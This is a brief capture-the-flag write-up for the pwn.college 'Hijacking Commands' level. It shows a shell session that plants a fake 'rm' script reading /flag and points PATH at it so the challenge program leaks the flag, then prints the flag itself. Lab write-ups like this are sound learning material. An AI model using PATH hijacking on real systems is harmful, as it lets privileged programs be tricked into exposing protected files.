# Challenge Name
Hijacking Commands

## My solve
**Flag:** `pwn.college{MZ_EfSPmn1slQ-642Pg3ASsl5JR.QX3cjM1wyM5EzNzEzW}`


```bash
hacker@path~hijacking-commands:~$ mkdir ~/hijack
hacker@path~hijacking-commands:~$ cat > ~/hijack/rm << "EOF"
> #!/bin/bash
> /bin/cat /flag
> EOF
hacker@path~hijacking-commands:~$ chmod a+x ~/hijack/rm
hacker@path~hijacking-commands:~$ PATH=~/hijack
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{MZ_EfSPmn1slQ-642Pg3ASsl5JR.QX3cjM1wyM5EzNzEzW}

```

## Incorrect tangents I went on
None

## What I learned
I learnt to create a decoy function for actual functions.

## References 
None
